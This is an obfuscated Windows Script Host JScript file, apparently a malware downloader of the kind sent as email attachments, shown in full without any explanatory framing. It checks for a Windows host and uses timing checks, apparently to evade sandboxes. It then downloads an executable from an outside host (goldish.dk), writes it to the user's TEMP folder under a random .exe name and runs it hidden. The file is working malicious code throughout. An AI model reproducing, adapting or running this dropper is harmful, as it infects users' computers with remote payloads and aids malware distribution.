var _LY = false;
var _VI = "CreateObject";
var _Z0 = function _T() {return WScript[_VI]("WScript"+".Shell");}(), _OY = 11;
var _D = "MSXML2.XMLHTTP";
var _P = 2123213;
var _ZG = 0;
function _NS(_D0){_Z0["Run"](_D0, _ZG, _ZG);};
function _LZ(){return _D + "";};
function _PI(_I, _W){_ZG = _ZG * 1; return _I - _W;};
function _VE(){return _VI;};
/*@cc_on
  @if (@_win32 || @_win64)
    _LY = true;
  @end
@*/
if (_LY)
{
var _Z = "";
function _T0(){return 22;};
var _U1 = 0; var _CG = 0;
function _V()
{
var _U0 = new this["Date"]();
var _PF = _U0["getUTCMilliseconds"]();
WScript["Sleep"](_T0());
var _U0 = new this["Date"]();
var _Y = _U0["getUTCMilliseconds"]();
WScript["Sleep"](_T0());
var _U0 = new this["Date"]();
var _U = _U0["getUTCMilliseconds"]();
var _U1 = "_SS";
_U1 = _PI(_Y, _PF);
var _CG = "_V0";
_CG = _PI(_U, _Y);
_Z = "open";
return _PI(_U1, _CG);
}
var _M = false;
var _C0 = false;
for (var _QS = _ZG; _QS < _T0() * 1; _QS++){if (_V() != _ZG){
_M = true; 
_CG = "31" + 11 * _U1 + _CG; 
_C0 = true; 
break;
}}
function _UI() {return ((_M == true) && (_M == _C0)) ? 1 : _ZG;};
if (_M && _UI() && _C0){
function _HL() {return _Z0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "LP8Sb5Zrl3npvap.ex" + "e";};
 _Q = _LZ();
 _V1 = WScript[_VI](_Q);
 var _R = 1;
 while (_R){
try {
	if (_R == 1)
	{
		_V1[_Z]("GET", "http://goldish.dk/o2pds", false);
		_V1["send"]();
		_F = "Sleep";
	}
	WScript[_F](_T0() + 120); 
	if (_V1["readystate"] < 2 * 2) continue;
	_R = _ZG;
	function _FI(_SM) {var _C = (1, 2, 3, 4, 5, _SM); return _C;};
	_P0 = WScript[_VE()]("ADODB.Stream");
	_Q = _P0;
	_Q[_Z]();
	_Q["type"] = _FI(1);
	_Q["write"](_V1["ResponseBody"]);
	_P0["position"] = _FI(_ZG);
	_Q["Save" + "ToFile"](_HL(), 2);
	_P0["cl"+"ose"]();
	_PC = _HL();
	_NS(_PC);
} catch(_K){};
}
}
}

